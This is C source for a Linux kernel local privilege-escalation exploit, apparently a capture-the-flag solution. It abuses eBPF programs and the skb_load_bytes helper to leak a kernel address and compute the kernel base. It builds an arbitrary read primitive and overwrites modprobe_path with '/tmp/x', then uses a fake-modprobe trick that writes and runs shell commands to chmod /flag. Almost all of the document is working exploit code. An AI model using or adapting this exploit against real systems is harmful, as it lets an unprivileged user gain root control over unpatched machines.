int update_item(int fd, int idx, uint64_t value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)&idx,
        .value = (uint64_t)&value,
        .flags = BPF_ANY,
    };
    // printf("[+] update_item;\n\tmap_fd: %d\n\tidx: 0x%x\n\tvalue: 0x%lx\n", fd,
    // idx, value);
    return _bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

uint64_t get_item(int fd, uint64_t idx)
{
    char value[0x800];
    uint64_t index = idx;
    union bpf_attr *attr = calloc(1, sizeof(union bpf_attr));
    attr->map_fd = fd;
    attr->key = (uint64_t)&idx;
    attr->value = (uint64_t)value;

    if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) < 0)
    {
        die("[!] Failed to lookup");
    }

    return *(uint64_t *)value;
}

uint64_t* get_bigitem(int fd, uint64_t idx)
{
    char value[0x800];
    uint64_t index = idx;
    union bpf_attr *attr = calloc(1, sizeof(union bpf_attr));
    attr->map_fd = fd;
    attr->key = (uint64_t)&idx;
    attr->value = (uint64_t)value;

    if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) < 0)
    {
        die("[!] Failed to lookup");
    }

    return value;
}

uint32_t READ32(uint64_t target)
{
    update_item(control_map, 0, 0);
    update_item(control_map, 1, target - 0x58);

    if (send(reader_sock, HELLO_MSG, MSG_LEN, 0) < 0)
    {
        die("[!] Failed to send HELLO_MSG");
    }

    struct bpf_map_info *info = calloc(1, sizeof(struct bpf_map_info));

    union bpf_attr push_attr = {
        .info.bpf_fd = read_map,
        .info.info_len = sizeof(*info),
        .info.info = (uint64_t)info,
    };
    if (_bpf(BPF_OBJ_GET_INFO_BY_FD, &push_attr, sizeof(push_attr)) < 0)
    {
        die("[!] Failed to get push");
    }
    return info->btf_id;
}

uint64_t READ64(uint64_t target)
{
    uint64_t low = READ32(target);
    uint64_t high = READ32(target + 4);
    return low + (high << 32);
}

uint64_t leak_kernel()
{
    int leak_fd;
    struct bpf_insn prog[] = {
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),        // save ctx to r8
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_10),       // r9 = rsp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, -0x50),   // r9 = fp - 0x50

        BPF_LD_MAP_FD(BPF_REG_1, read_map),         // r1 = map_fd
        BPF_ST_MEM(BPF_DW, BPF_REG_9, 0, 0),        // key = [rsp] = 0;
        BPF_ST_MEM(BPF_DW, BPF_REG_9, 8, 0),       // key = [rsp + 8] = 0;
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_9),       // r2 = rsp
        BPF_MOV64_IMM(BPF_REG_0, 0),             // r0 = 0
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
        BPF_EXIT_INSN(),                         // else exit
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),     // r6 = &array[0]
        
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),     // recover ctx

        BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_6, 0x10), // [rsp + 0x10] = array
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_9), // r3 = void *to

        BPF_MOV64_IMM(BPF_REG_4, 0x1 - 1),
        BPF_MOV64_IMM(BPF_REG_5, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_4, BPF_REG_5),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 1),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_4), // r2 = offset

        BPF_LD_IMM64(BPF_REG_4, 0x12 - 1),
        BPF_MOV64_IMM(BPF_REG_5, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_4, BPF_REG_5),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 1),
        BPF_MOV64_REG(BPF_REG_4, BPF_REG_4), // r4 = len

        BPF_MOV64_IMM(BPF_REG_0, 0),       // r0 = 0
        BPF_EMIT_CALL(BPF_skb_load_bytes), // r0 = lookup_elem

        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_9, 0x10),
        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_3, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_3, 0),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()

    };
    int insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    // printf("[+] insn_cnt = %d\n", insn_cnt);
    leak_fd = prog_load(prog, insn_cnt);
    printf("[+] leak_fd = %d\n", leak_fd);
    int sockets[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) < 0)
    {
        die("[!] Failed in socketpair");
    }

    if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &leak_fd,
                   sizeof(leak_fd)) < 0)
    {
        die("[!] Failed to attach BPF");
    }
    puts("[+] leak ATTACH_BPF");
    char *buf = calloc(1, 0x40);
    buf[0x12] = 0x10*guessed;
    if (send(sockets[1], buf, 0x40, 0) < 0)
    {
        die("[!] Failed to send HELLO_MSG");
    }
    uint64_t leak = get_item(read_map, 0);
    // printf("[+] Leak:\t0x%lx\n", leak);

    return leak;
}
void get_flag(void){
    puts("[*] Setting up for fake modprobe");
    
    system("echo '#!/bin/sh\nchmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /flag");

    exit(0);
}

int main(int argc, char **argv)
{
    int pwn = atoi(argv[2]);
    guessed = atol(argv[1]);
    control_map = create_map(0x8, 0x10);
    read_map = create_map(0x700, 1);
    write_map = create_map(0x700, 1);

    update_item(control_map, 0, 0xaaaaaaaaa);
    update_item(control_map, 1, 0xdddddddd);
    update_item(read_map, 0, 0xccccccccc);

    uint64_t leak = leak_kernel();
    printf("[+] Leak:\t0x%lx\n", leak);
    kernbase = leak - 0x1238560 - 0x880;
    uint64_t array_map_ops = leak;
    init_task = kernbase + 0x1e13940;
    modprobe_path = kernbase + 0x1e6f4e0; // ffffffff82e6f4e0
    printf("[+] kernbase: 0x%lx\n", kernbase);
    printf("[+] array_map_ops: 0x%lx\n", array_map_ops);
    printf("[+] modprobe_path: 0x%lx\n", modprobe_path);

  struct bpf_insn writer_prog[] = {
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),        // save ctx to r8
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_10),       // r9 = rsp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, -0x50),   // r9 = fp - 0x50

        BPF_LD_MAP_FD(BPF_REG_1, read_map),         // r1 = map_fd
        BPF_ST_MEM(BPF_DW, BPF_REG_9, 0, 0),        // key = [rsp] = 0;
        BPF_ST_MEM(BPF_DW, BPF_REG_9, 8, 0),       // key = [rsp + 8] = 0;
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_9),       // r2 = rsp
        BPF_MOV64_IMM(BPF_REG_0, 0),             // r0 = 0
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
        BPF_EXIT_INSN(),                         // else exit
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),     // r6 = &array[0]
        
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),     // recover ctx

        BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_6, 0x10), // [rsp + 0x10] = array
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_9), // r3 = void *to

        BPF_MOV64_IMM(BPF_REG_4, 0x1 - 1),
        BPF_MOV64_IMM(BPF_REG_5, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_4, BPF_REG_5),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 1),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_4), // r2 = offset

        BPF_LD_IMM64(BPF_REG_4, 0x18 - 1),
        BPF_MOV64_IMM(BPF_REG_5, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_4, BPF_REG_5),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 1),
        BPF_MOV64_REG(BPF_REG_4, BPF_REG_4), // r4 = len

        BPF_MOV64_IMM(BPF_REG_0, 0),       // r0 = 0
        BPF_EMIT_CALL(BPF_skb_load_bytes), // r0 = lookup_elem

        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_9, 0x10),
        BPF_LD_IMM64(BPF_REG_4, 0x782f706d742f), // 2f 74 6d 70 2f 78 /tmp/x
        BPF_STX_MEM(BPF_DW, BPF_REG_3, BPF_REG_4, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
};
    if(pwn) {
  writer_fd =
      prog_load(writer_prog, sizeof(writer_prog) / sizeof(struct bpf_insn));
  printf("[+] writer_fd = %d\n", writer_fd);

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0) {
    die("[!] Failed in socketpair");
  }
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &writer_fd,
                 sizeof(writer_fd)) < 0) {
    die("[!] Failed to attach BPF");
  }
  puts("[+] Writer ATTACH_BPF");
  writer_sock = socks[1];
  char *buf = calloc(1, 0x40);
  *(uint64_t *)&buf[0x11] = modprobe_path;
  if (send(writer_sock, buf, 0x40, 0) < 0) {
    die("[!] Failed to send HELLO_MSG");
  }
    get_flag();
    }
  return 0;
}
```


